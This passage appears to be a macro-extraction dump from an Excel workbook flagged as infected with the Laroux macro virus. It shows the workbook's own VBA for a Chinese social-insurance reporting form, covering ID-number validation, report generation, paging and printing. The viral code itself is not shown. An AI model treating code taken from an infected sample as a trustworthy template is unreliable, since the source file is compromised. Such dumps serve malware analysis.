End If
End Function

Function SfzHjc(zHao) As String '导入身份证号码检测
On Error Resume Next
Dim wi As Variant, Ji As Variant, sum%, i%, intMsg%
wi = Array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2)
Ji = Array("1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2")
sum = 0
If Len(zHao) = 15 Then
 If Not IsNumeric(zHao) Then
  SfzHjc = "15位身份证号中有非法字符！"
  Exit Function
 End If
 zHao = Left(zHao, 6) & "19" & Right(zHao, 9)
ElseIf Len(zHao) = 18 Then
 If Not (IsNumeric(Mid(zHao, 1, 17)) And (IsNumeric(Right(zHao, 1)) Or Right(zHao, 1) = "X" Or Right(zHao, 1) = "x")) Then
SfzHjc = "18位身份证号中有非法字符！"
  Exit Function
 End If
Else
SfzHjc = "身份证号码位数不对！"
 Exit Function
End If
If IsError(DateValue(Mid(zHao, 7, 4) & "-" & Mid(zHao, 11, 2) & "-" & Mid(zHao, 13, 2))) Or Val(Mid(zHao, 7, 4)) > Year(Date) Or Val(Mid(zHao, 7, 4)) < Year(Date) - 200 Then
SfzHjc = "身份证号中日期信息有误！"
 Exit Function
End If

For i = 0 To UBound(wi)
 sum = sum + Mid(zHao, i + 1, 1) * wi(i)
Next i

If Len(zHao) = 17 Then
    SfzHjc = zHao & Ji(sum Mod 11)
    Else
        If Ji(sum Mod 11) <> Right(zHao, 1) Then
           
                    SfzHjc = Mid(zHao, 1, 17) & Ji(sum Mod 11)
                   
                    Exit Function
             
       
        End If
    End If
End Function



-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
ActiveSheet.Protect  '保护
End Sub
Private Sub Worksheet_Activate()

Call 清空_Click

End Sub



Private Sub 打印_Click()
Sheets("综合申报表").PrintOut
End Sub

Private Sub 清空_Click()


Dim i As Long


 Application.ScreenUpdating = False
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("历史数据").Unprotect  '撤销保护工作表
    Sheets("综合申报表").Unprotect  '撤销保护工作表

    
        Sheets("综合申报表").Cells(6, 3) = ""
        Sheets("综合申报表").Cells(7, 3) = ""
        Sheets("综合申报表").Cells(8, 3) = ""
        Sheets("综合申报表").Cells(9, 3) = ""
        Sheets("综合申报表").Cells(8, 8) = ""
        Sheets("综合申报表").Cells(9, 8) = ""
        Sheets("综合申报表").Cells(6, 11) = ""
        Sheets("综合申报表").Cells(9, 11) = ""
        Sheets("综合申报表").Cells(5, 6) = ""
        Sheets("综合申报表").Cells(12, 2) = ""
        Sheets("综合申报表").Cells(19, 2) = ""
    
        Sheets("综合申报表").Range("b12:e22,g12:j22").ClearContents

End Sub

Private Sub 生成_Click()

Dim i As Integer   '定义用于循环的整型变量
Dim j, j1, k, k1, L, m, n, t, z As Integer '定义用于循环的整型变量
'定义用于保存“读者信息”记录数的整型变量
Dim iCount As Integer
'定义判断记录是否在的布尔变量
Dim Cunzai, nMsg As Boolean
'Dim sbh, name, number As String '定义个人社保号、姓名、身份证号
Dim nChoice As Variant '操作选项
Dim a(11), b(11), c(11), d(11), e(11) As Variant '临时数组 更新月快报表显示 2005-07-21 Y.H.update
Dim nYear, nMonth, nDate As String



 Application.ScreenUpdating = False
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("历史数据").Unprotect  '撤销保护工作表
    Sheets("综合申报表").Unprotect  '撤销保护工作表

    
    
    '把“数据库”工作表的记录行数赋予iCount
    iCount = Sheets("历史数据").[a2].CurrentRegion.Rows.Count
    '为CunZai布尔变量赋初值


If iCount <= 2 Then
        MsgBox ("未有缴费记录")
        Exit Sub '返回
    End If
      
    nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年"
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月"
    'nDate = nYear + nMonth
     Shenbq.Show
    
    If Shenbq.rh.Value = "" Then
    Exit Sub
    End If
    
    nDate = Shenbq.rh + "年 " + Shenbq.ee + "月"
     
'    MsgBox iCount
    
    
        Sheets("综合申报表").Cells(6, 3) = ""
        Sheets("综合申报表").Cells(7, 3) = ""
        Sheets("综合申报表").Cells(8, 3) = ""
        Sheets("综合申报表").Cells(9, 3) = ""
        Sheets("综合申报表").Cells(8, 8) = ""
        Sheets("综合申报表").Cells(9, 8) = ""
        Sheets("综合申报表").Cells(6, 11) = ""
        Sheets("综合申报表").Cells(9, 11) = ""
        Sheets("综合申报表").Cells(5, 6) = ""
        Sheets("综合申报表").Cells(12, 2) = ""
        Sheets("综合申报表").Cells(19, 2) = ""
        Sheets("综合申报表").Range("b12:e22,g12:j22").ClearContents

    
   
    
    For i = 1 To 11
    
    a(i) = 0
    b(i) = 0
    c(i) = 0
    d(i) = 0
    e(i) = 0
    
    Next i
    
    z = 0
    t = 0
    
          
For i = iCount To 3 Step -1

               
    If Sheets("历史数据").Cells(i, 10) = "在职" And Sheets("历史数据").Cells(i, 47) = nDate Then
        z = z + 1
               For j = 1 To 7
                If Sheets("历史数据").Cells(i, 7 + 5 * j) <> "" Then
               a(j) = a(j) + 1
               b(j) = b(j) + Sheets("历史数据").Cells(i, 11)
               c(j) = c(j) + Sheets("历史数据").Cells(i, 9 + 5 * j)
               d(j) = d(j) + Sheets("历史数据").Cells(i, 10 + 5 * j)
               e(j) = e(j) + Sheets("历史数据").Cells(i, 11 + 5 * j)
                End If
             Next
 End If
 If (Sheets("历史数据").Cells(i, 10) = "退休" Or Sheets("历史数据").Cells(i, 10) = "离休") And Sheets("历史数据").Cells(i, 47) = nDate Then
  t = t + 1
      If Sheets("历史数据").Cells(i, 27) <> "0410" And Sheets("历史数据").Cells(i, 27) <> "" Then
      
      a(8) = a(8) + 1
      b(8) = b(8) + Sheets("历史数据").Cells(i, 11)
      c(8) = c(8) + Sheets("历史数据").Cells(i, 29)
      d(8) = d(8) + Sheets("历史数据").Cells(i, 30)
      e(8) = e(8) + Sheets("历史数据").Cells(i, 31)
      End If
    If Sheets("历史数据").Cells(i, 27) = "0410" Then
      a(9) = a(9) + 1
      b(9) = b(9) + Sheets("历史数据").Cells(i, 11)
      c(9) = c(9) + Sheets("历史数据").Cells(i, 29)
      d(9) = d(9) + Sheets("历史数据").Cells(i, 30)
      e(9) = e(9) + Sheets("历史数据").Cells(i, 31)
      End If
     
  
  
   For k = 10 To 11
                If Sheets("历史数据").Cells(i, 32 + 5 * (k - 10)) <> "" Then
               a(k) = a(k) + 1
               b(k) = b(k) + Sheets("历史数据").Cells(i, 11)
               c(k) = c(k) + Sheets("历史数据").Cells(i, 34 + 5 * (k - 10))
               d(k) = d(k) + Sheets("历史数据").Cells(i, 35 + 5 * (k - 10))
               e(k) = e(k) + Sheets("历史数据").Cells(i, 36 + 5 * (k - 10))
                End If
             Next
  
  
 End If
 
 Next
     Sheets("综合申报表").Cells(12, 2) = z
     Sheets("综合申报表").Cells(19, 2) = t
     
    For L = 12 To 22  '清空原来显示内容 20080530 yh update
        Sheets("综合申报表").Cells(L, 3) = a(L - 11)
        Sheets("综合申报表").Cells(L, 4) = b(L - 11)
        Sheets("综合申报表").Cells(L, 5) = c(L - 11)
        Sheets("综合申报表").Cells(L, 9) = d(L - 11)
        Sheets("综合申报表").Cells(L, 10) = e(L - 11)
        
        If Sheets("综合申报表").Cells(L, 5) > 0 Then
           Sheets("综合申报表").Cells(L, 7) = d(L - 11) / c(L - 11)
           Sheets("综合申报表").Cells(L, 8) = e(L - 11) / c(L - 11)
        Else
           Sheets("综合申报表").Cells(L, 7) = 0
           Sheets("综合申报表").Cells(L, 8) = 0
        End If
        

    Next
    
     For n = 12 To 22  '清空原来显示内容 20080530 yh update
        
        If Sheets("综合申报表").Cells(n, 3) = 0 Then
        Sheets("综合申报表").Cells(n, 3) = "---"
        End If
        
       If Sheets("综合申报表").Cells(n, 4) = 0 Then
       Sheets("综合申报表").Cells(n, 4) = "---"
       End If
       
        If Sheets("综合申报表").Cells(n, 5) = 0 Then
        Sheets("综合申报表").Cells(n, 5) = "---"
        End If
        
          If Sheets("综合申报表").Cells(n, 7) = 0 Then
      Sheets("综合申报表").Cells(n, 7) = "---"
      End If
      
      If Sheets("综合申报表").Cells(n, 8) = 0 Then
      Sheets("综合申报表").Cells(n, 8) = "---"
      End If
        
        
      If Sheets("综合申报表").Cells(n, 9) = 0 Then
      Sheets("综合申报表").Cells(n, 9) = "---"
      End If
      
      If Sheets("综合申报表").Cells(n, 10) = 0 Then
      Sheets("综合申报表").Cells(n, 10) = "---"
      End If
      
      Next
      
      
        Sheets("综合申报表").Cells(6, 3) = nDate
        Sheets("综合申报表").Cells(7, 3) = Sheets("主页").Cells(5, 3)
        Sheets("综合申报表").Cells(8, 3) = Sheets("主页").Cells(7, 3)
        Sheets("综合申报表").Cells(9, 3) = Sheets("主页").Cells(5, 8)
        Sheets("综合申报表").Cells(8, 8) = Sheets("主页").Cells(6, 3)
        Sheets("综合申报表").Cells(9, 8) = Sheets("主页").Cells(6, 10)
        Sheets("综合申报表").Cells(6, 11) = Sheets("主页").Cells(7, 8)
        Sheets("综合申报表").Cells(9, 11) = Sheets("主页").Cells(7, 10)
        Sheets("综合申报表").Cells(5, 6) = Sheets("主页").Cells(3, 11)
        


End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public total_page, current_page As Integer '全局变量－页面

Public start_index, end_index, current_index, k As Integer '全局变量－增员、减员的起始记录，终止记录，当前记录的指针

Public xxx As Integer  '暂时无作用
Public nYear, nMonth, nDate As String
Dim Hang(65536) As Integer '临时数组 更新月快报表显示 2005-07-21 Y.H.update



Private Sub Worksheet_SelectionChange(ByVal Target As Range)
ActiveSheet.Protect  '保护
End Sub

Private Sub Worksheet_Activate()
Call 清空_Click
End Sub

Private Sub 生成_Click()
 Dim i As Integer   '定义用于循环的整型变量
Dim j As Integer   '定义用于循环的整型变量
'定义用于保存“读者信息”记录数的整型变量
Dim iCount As Integer
'定义判断记录是否在的布尔变量
Dim Biaom As String

Dim Cunzai, nMsg As Boolean
Dim Ze, Ji, Bi, Al As Long


   biandb.Show
   
    If biandb.zeng.Value = True Then
      Ze = 1
    Else
      Ze = 0
    End If
    
    If biandb.jiang.Value = True Then
       Ji = 1
       Else
       Ji = 0
    End If
    
    If biandb.bian.Value = True Then
       Bi = 1
       Else
       Bi = 0
    End If
    
    Al = Ze + Ji + Bi
    
    If Al = 0 Then
      Exit Sub
    End If
  
   
   
    
    nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年"
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月"
    nDate = nYear + nMonth
    ' MsgBox nDate


    Application.ScreenUpdating = False
    ActiveSheet.Unprotect  '撤销保护工作表
    
    
       ThisWorkbook.Sheets("个人明细").Unprotect    '  20070716 yh. update  该语句不可少，否则会出错。
                 
    iCount = Sheets("个人明细").[a1].CurrentRegion.Rows.Count
    '为CunZai布尔变量赋初值
    'ReDim Hang(UBound(Hang) + iCount)
    
    
    
     k = -1
     
If Ze = 1 Then
      For i = 3 To iCount
      
     If Sheets("个人明细").Cells(i, 1) = "增员" And Sheets("个人明细").Cells(i, 19) = nDate Then
          k = k + 1
          'Sheets("个人明细").Cells(i, 50) = Int(K / 15) + 1
          Hang(k + 1) = i
     End If
     Next i
         Hang(k + 2) = 0
End If
'取增员结束
         
         
If Ji = 1 Then
         
     For i = 3 To iCount
         If Sheets("个人明细").Cells(i, 1) = "减员" And Sheets("个人明细").Cells(i, 19) = nDate Then
          k = k + 1
          'Sheets("个人明细").Cells(i, 50) = Int(K / 15) + 1
          Hang(k + 1) = i
         End If
     
     Next i
        Hang(k + 2) = 0
        
End If
'取减员结束


If Bi = 1 Then
     
      For i = 3 To iCount
         If Sheets("个人明细").Cells(i, 20) = nDate And Sheets("个人明细").Cells(i, 1) = "正常" Then
          k = k + 1
          'Sheets("个人明细").Cells(i, 50) = Int(K / 15) + 1
          Hang(k + 1) = i
         End If
     
     Next i
     Hang(k + 2) = 0

End If
'取修改结束


     
If k = -1 Then
Sheets("变动表").Select
Exit Sub
Else

total_page = Int(k / 15) + 1


End If

   Biaom = "参加社会保险人员" '设置报表标题
   
   If Ze = 1 Then
     If Ji = 1 Then
     Biaom = Biaom & "增"
     Else
     Biaom = Biaom & "增员"
     End If
   End If
   
   If Ji = 1 Then
   
        If Ze = 1 Then
          Biaom = Biaom & "、减变动"
          Else
          Biaom = Biaom & "减员"
        End If
   End If
   
   If Bi = 1 Then
       If Ze + Ji > 0 Then
           Biaom = Biaom & "和个人信息变更"
           Else
           Biaom = Biaom & "个人信息变更"
        End If
    End If
    
     Biaom = Biaom & "申报表"
    
    '表头设完
    
     
  
    Application.EnableEvents = False
   Application.ScreenUpdating = False
   
    Sheets("变动表").Unprotect
    
    Sheets("变动表").Cells(2, 1) = Biaom
    
    Range("A8:S22").Select
    Selection.ClearContents
    
     Application.ScreenUpdating = True
   
    Sheets("变动表").Protect
    Application.EnableEvents = True

   Sheets("变动表").Select
   'Call 清空_Click增、减变动和个人信息变更申报表
     
End Sub
     
Private Sub 显示页面()
Dim i, j, h As Integer '定义用于循环的整型变量
'Dim iCount As Integer
If k = -1 Then
MsgBox ("本月没有变动记录！")
Exit Sub
End If


    Application.ScreenUpdating = False
    'Sheets("个人明细").Unprotect
    'Sheets("个人明细").Select
    Sheets("变动表").Unprotect
    
    'iCount = Sheets("个人明细").[A1].CurrentRegion.Rows.Count
    Sheets("变动表").Select
   For i = 8 To 22
     For j = 1 To 19
     
                    Sheets("变动表").Cells(i, j) = ""
                    Sheets("变动表").Cells(i, j).Font.Bold = False
    Next j
   Next i
   
   
             Sheets("变动表").Cells(5, 10) = nDate
             Sheets("变动表").Cells(5, 17) = Sheets("主页").Cells(3, 11)
             Sheets("变动表").Cells(4, 10) = Sheets("主页").Cells(7, 3)
             Sheets("变动表").Cells(4, 17) = Sheets("主页").Cells(6, 3)
             Sheets("变动表").Cells(5, 3) = Sheets("主页").Cells(5, 8)
             Sheets("变动表").Cells(31, 14) = total_page
             Sheets("变动表").Cells(31, 18) = current_page

   
   
   
   
   'j = 8
   

    For j = 8 To 22
    
        h = (current_page - 1) * 15 + j - 7
            If Hang(h) = 0 Then
               Exit For
            End If
            
          
           
             i = Hang(h)
             Sheets("变动表").Cells(j, 1) = Sheets("个人明细").Cells(i, 3)
             Sheets("变动表").Cells(j, 2) = Sheets("个人明细").Cells(i, 6)
             Sheets("变动表").Cells(j, 3) = Sheets("个人明细").Cells(i, 4)
             Sheets("变动表").Cells(j, 4) = Sheets("个人明细").Cells(i, 22)
             Sheets("变动表").Cells(j, 5) = Left(Sheets("个人明细").Cells(i, 9), 2)
             Sheets("变动表").Cells(j, 6) = Sheets("个人明细").Cells(i, 7)
             Sheets("变动表").Cells(j, 7) = Sheets("个人明细").Cells(i, 23)
             Sheets("变动表").Cells(j, 8) = Sheets("个人明细").Cells(i, 8)
             Sheets("变动表").Cells(j, 9) = Sheets("个人明细").Cells(i, 10)
             
             If Sheets("个人明细").Cells(i, 20) = nDate And Sheets("个人明细").Cells(i, 1) = "正常" Then
              Sheets("变动表").Cells(j, 10) = "修改"
             Else
              Sheets("变动表").Cells(j, 10) = Sheets("个人明细").Cells(i, 1)
             End If
             
             Sheets("变动表").Cells(j, 12) = Sheets("个人明细").Cells(i, 12)
             Sheets("变动表").Cells(j, 13) = Sheets("个人明细").Cells(i, 13)
             Sheets("变动表").Cells(j, 14) = Sheets("个人明细").Cells(i, 14)
             Sheets("变动表").Cells(j, 15) = Sheets("个人明细").Cells(i, 15)
             Sheets("变动表").Cells(j, 16) = Sheets("个人明细").Cells(i, 16)
             Sheets("变动表").Cells(j, 17) = Sheets("个人明细").Cells(i, 17)
             Sheets("变动表").Cells(j, 18) = Sheets("个人明细").Cells(i, 18)
             Sheets("变动表").Cells(j, 19) = Sheets("个人明细").Cells(i, 11)
           
                   If Sheets("变动表").Cells(j, 10) = "修改" Then
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 3)) > 0 Then
                        Sheets("变动表").Cells(j, 1).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 6)) > 0 Then
                        Sheets("变动表").Cells(j, 2).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 4)) > 0 Then
                        Sheets("变动表").Cells(j, 3).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 22)) > 0 Then
                        Sheets("变动表").Cells(j, 4).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 9)) > 0 Then
                        Sheets("变动表").Cells(j, 5).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 7)) > 0 Then
                        Sheets("变动表").Cells(j, 6).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 23)) > 0 Then
                        Sheets("变动表").Cells(j, 7).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 8)) > 0 Then
                        Sheets("变动表").Cells(j, 8).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 10)) > 0 Then
                        Sheets("变动表").Cells(j, 9).Font.Bold = True
                      End If
                      
                      
                        Sheets("变动表").Cells(j, 10).Font.Bold = True
                      
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 11)) > 0 Then
                        Sheets("变动表").Cells(j, 19).Font.Bold = True
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 12)) > 0 Then
                        Sheets("变动表").Cells(j, 12).Font.Bold = True
                         If Sheets("变动表").Cells(j, 12) = "" Then
                            Sheets("变动表").Cells(j, 12) = "×"
                         End If
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 13)) > 0 Then
                        Sheets("变动表").Cells(j, 13).Font.Bold = True
                        If Sheets("变动表").Cells(j, 13) = "" Then
                            Sheets("变动表").Cells(j, 13) = "×"
                         End If
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 14)) > 0 Then
                        Sheets("变动表").Cells(j, 14).Font.Bold = True
                        If Sheets("变动表").Cells(j, 14) = "" Then
                            Sheets("变动表").Cells(j, 14) = "×"
                         End If
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 15)) > 0 Then
                        Sheets("变动表").Cells(j, 15).Font.Bold = True
                        If Sheets("变动表").Cells(j, 15) = "" Then
                            Sheets("变动表").Cells(j, 15) = "×"
                         End If
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 16)) > 0 Then
                        Sheets("变动表").Cells(j, 16).Font.Bold = True
                        If Sheets("变动表").Cells(j, 16) = "" Then
                            Sheets("变动表").Cells(j, 16) = "×"
                         End If
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 17)) > 0 Then
                        Sheets("变动表").Cells(j, 17).Font.Bold = True
                        If Sheets("变动表").Cells(j, 17) = "" Then
                            Sheets("变动表").Cells(j, 17) = "×"
                         End If
                      End If
                      If InStr(Sheets("个人明细").Cells(i, 21), Sheets("个人明细").Cells(2, 18)) > 0 Then
                        Sheets("变动表").Cells(j, 18).Font.Bold = True
                        If Sheets("变动表").Cells(j, 18) = "" Then
                            Sheets("变动表").Cells(j, 18) = "×"
                         End If
                      End If
            
                  End If
                  
            
       
        
    Next j
    
    
    
    Application.ScreenUpdating = True
    Sheets("变动表").Protect
     

End Sub

Private Sub 打印_Click()
Dim i As Integer  '定义用于循环的整型变量

If total_page = "" Then
Call 生成_Click
End If

For i = 1 To total_page
current_page = i

Call 显示页面
Sheets("变动表").PrintOut
Next i
End Sub

Private Sub 末页_Click()
If total_page = "" Then
Call 生成_Click
End If


current_page = total_page
Call 显示页面


End Sub

Private Sub 清空_Click()
Dim i, j As Integer  '定义用于循环的整型变量
  Application.ScreenUpdating = False
    
    Sheets("变动表").Unprotect

                    Sheets("变动表").Range("a8:s22").ClearContents
                    Sheets("变动表").Range("a8:s22").Font.Bold = False
 
   
   
             Sheets("变动表").Cells(5, 10) = ""
             Sheets("变动表").Cells(5, 17) = ""
             Sheets("变动表").Cells(4, 10) = ""
             Sheets("变动表").Cells(4, 17) = ""
             Sheets("变动表").Cells(5, 3) = ""
             Sheets("变动表").Cells(31, 14) = ""
             Sheets("变动表").Cells(31, 18) = ""
             
             
'Call 生成

End Sub

Private Sub 上一页_Click()

If current_page = 1 Then
MsgBox ("本页是第一页！")
Exit Sub
End If

If total_page = "" Then
Call 生成_Click
current_page = total_page
Else
current_page = current_page - 1
End If


Call 显示页面


End Sub


Private Sub 首页_Click()
If total_page = "" Then
Call 生成_Click
End If

current_page = 1
Call 显示页面


End Sub

Private Sub 下一页_Click()

If current_page = total_page And total_page <> "" Then
MsgBox ("本页是最后一页！")
Exit Sub
End If



If total_page = "" Then
Call 生成_Click
current_page = 1
Else
current_page = current_page + 1
End If

Call 显示页面

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public total_page, current_page As Integer '全局变量－页面

Public start_index, end_index, current_index, n, k, a As Integer '全局变量－增员、减员的起始记录，终止记录，当前记录的指针

Public xxx As Integer  '暂时无作用
Public nYear, nMonth, nDate As String
Dim yebj(3277) As Long



Private Sub Worksheet_SelectionChange(ByVal Target As Range)
   ActiveSheet.Protect  '保护
End Sub
Private Sub Worksheet_Activate()

Call 清空_Click
End Sub
    
    
Private Sub 生成_Click()
 Dim i, j, m As Integer '定义用于循环的整型变量
'定义用于保存“读者信息”记录数的整型变量
Dim iCount As Integer
'定义判断记录是否在的布尔变量
Dim Cunzai, nMsg As Boolean
'Dim sbh, name, number As String '定义个人社保号、姓名、身份证号
Dim nChoice As Variant '操作选项
       

    
    nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年" '年
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月" '月
    
    
     Shenbq.Show
    
    If Shenbq.rh.Value = "" Then
    Exit Sub
    End If
    
    nDate = Shenbq.rh + "年 " + Shenbq.ee.Value + "月"
    
   ' nDate = nYear + nMonth
'    MsgBox nDate
   

    Application.ScreenUpdating = False
    Sheets("历史数据").Unprotect
    
    
    '把“数据库”工作表的记录行数赋予iCount
    iCount = Sheets("历史数据").[a1].CurrentRegion.Rows.Count
    '为CunZai布尔变量赋初值
       
    'Sheets("名册").Unprotect
    'Call 清空_Click
    'ReDim Preserve yebj(UBound(yebj) + iCount)
    
    a = 0
     k = -1
For i = 3 To iCount
      
     If Sheets("历史数据").Cells(i, 47) = nDate Then
          k = k + 1
            If (k Mod 20) = 0 Then
            m = Int(k / 20) + 1
            yebj(m) = i
            End If
     End If
             
Next i
     
     
     
If k = -1 Then
'Sheets("名册").Select
Exit Sub
Else

total_page = Int(k / 20) + 1


End If

   'Sheets("名册").Select
Application.ScreenUpdating = True
    Sheets("历史数据").Protect
    Sheets("名册").Protect
     
End Sub
     
Private Sub 显示页面()
Dim i As Integer   '定义用于循环的整型变量
Dim j, Y As Integer   '定义用于循环的整型变
'Dim iCount As Integer
If k = -1 Then
MsgBox ("未有本月申报记录，请先导出本月报盘申报文件！")
Exit Sub
End If


    Application.ScreenUpdating = False
    'Sheets("历史数据").Unprotect
    'Sheets("历史数据").Select
    Sheets("名册").Unprotect
    
    'iCount = Sheets("个人明细").[A1].CurrentRegion.Rows.Count
    Sheets("名册").Select
   Sheets("名册").Range("a10:u29").ClearContents
   
    Sheets("名册").Cells(6, 3) = Sheets("主页").Cells(3, 11)
    
    Sheets("名册").Cells(6, 8) = nDate
    
    Sheets("名册").Cells(6, 19) = Sheets("主页").Cells(6, 10)
    Sheets("名册").Cells(5, 8) = Sheets("主页").Cells(7, 3)
    Sheets("名册").Cells(5, 17) = Sheets("主页").Cells(6, 3)
    Sheets("名册").Cells(31, 16) = total_page
    Sheets("名册").Cells(31, 20) = n
   

   j = 10

    For i = start_index To end_index
            
      
           If Sheets("历史数据").Cells(i, 47) = nDate Then
             Y = (n - 1) * 20 + j - 9
             
             Sheets("名册").Cells(j, 1) = Y
             Sheets("名册").Cells(j, 2) = Sheets("历史数据").Cells(i, 4)
             Sheets("名册").Cells(j, 3) = Sheets("历史数据").Cells(i, 3)
             Sheets("名册").Cells(j, 4) = Sheets("历史数据").Cells(i, 6)
             Sheets("名册").Cells(j, 5) = Sheets("历史数据").Cells(i, 49)
             Sheets("名册").Cells(j, 6) = Left(Sheets("历史数据").Cells(i, 9), 2)
             Sheets("名册").Cells(j, 7) = Sheets("历史数据").Cells(i, 50)
             Sheets("名册").Cells(j, 8) = Sheets("历史数据").Cells(i, 7)
             Sheets("名册").Cells(j, 9) = Sheets("历史数据").Cells(i, 8)
             Sheets("名册").Cells(j, 10) = Sheets("历史数据").Cells(i, 11)
             
             Sheets("名册").Cells(j, 11) = Sheets("历史数据").Cells(i, 15)
             Sheets("名册").Cells(j, 12) = Sheets("历史数据").Cells(i, 16)
             
             Sheets("名册").Cells(j, 13) = Sheets("历史数据").Cells(i, 30)
             Sheets("名册").Cells(j, 14) = Sheets("历史数据").Cells(i, 31)
             
             Sheets("名册").Cells(j, 15) = Sheets("历史数据").Cells(i, 35)
             
            If Sheets("名册").Cells(2, 3) = "财政" Then
             Sheets("名册").Cells(j, 16) = Sheets("历史数据").Cells(i, 40)
            End If
            If Sheets("名册").Cells(2, 3) = "自筹" Then
             Sheets("名册").Cells(j, 17) = Sheets("历史数据").Cells(i, 40)
            End If
             
             Sheets("名册").Cells(j, 18) = Sheets("历史数据").Cells(i, 25)
             
             Sheets("名册").Cells(j, 19) = Sheets("历史数据").Cells(i, 26)
             
             Sheets("名册").Cells(j, 20) = Sheets("历史数据").Cells(i, 20)
             
             Sheets("名册").Cells(j, 21) = Sheets("历史数据").Cells(i, 45)




             
             j = j + 1
           
            End If
       
        
    Next i
    For i = 10 To 29
       If Sheets("名册").Cells(i, 2) = "" Then
       Exit For
       End If
      For j = 1 To 21
          If Sheets("名册").Cells(i, j) = "" Or Sheets("名册").Cells(i, j) = 0 Then
            Sheets("名册").Cells(i, j) = "---"
          End If
     Next j
     Next i
     
Application.ScreenUpdating = True
Sheets("名册").Protect
End Sub

Private Sub 打印_Click()

On Error GoTo ErrorHandler:

For n = 1 To total_page
start_index = yebj(n)
end_index = start_index + 19
Call 显示页面
Sheets("名册").PrintOut
Next n
ErrorHandler:
End Sub

Private Sub 末页_Click()

On Error GoTo ErrorHandler:
n = total_page
start_index = yebj(n)
end_index = start_index + 19

Call 显示页面

ErrorHandler:
End Sub

Private Sub 清空_Click()

Dim i, j As Integer  '定义用于循环的整型变量


    Application.ScreenUpdating = False
    Sheets("名册").Select

    Sheets("名册").Unprotect
    
   
     
    Sheets("名册").Range("a10:u29").ClearContents
    

    Sheets("名册").Cells(6, 3) = ""
    
    Sheets("名册").Cells(6, 8) = ""
    
    Sheets("名册").Cells(6, 19) = ""
    Sheets("名册").Cells(5, 8) = ""
    Sheets("名册").Cells(5, 17) = ""
    Sheets("名册").Cells(31, 16) = ""
    Sheets("名册").Cells(31, 20) = ""
    'Call 生成

End Sub

Private Sub 上一页_Click()
On Error GoTo ErrorHandler:

If n = 1 Then
MsgBox ("本页是第一页！")
Exit Sub
End If

If n = "" Then
n = total_page
Else
n = n - 1
End If

start_index = yebj(n)
end_index = start_index + 19

Call 显示页面

ErrorHandler:
End Sub

Private Sub 首页_Click()

On Error GoTo ErrorHandler:
n = 1
start_index = yebj(n)
end_index = start_index + 19


Call 显示页面

ErrorHandler:
End Sub

Private Sub 下一页_Click()


On Error GoTo ErrorHandler:


If n = total_page And total_page <> "" Then
MsgBox ("本页是最后一页！")
Exit Sub


End If




If n = "" Then
n = 1
Else
n = n + 1
End If
start_index = yebj(n)
end_index = start_index + 19
Call 显示页面
ErrorHandler:

End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
ActiveSheet.Protect  '保护
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
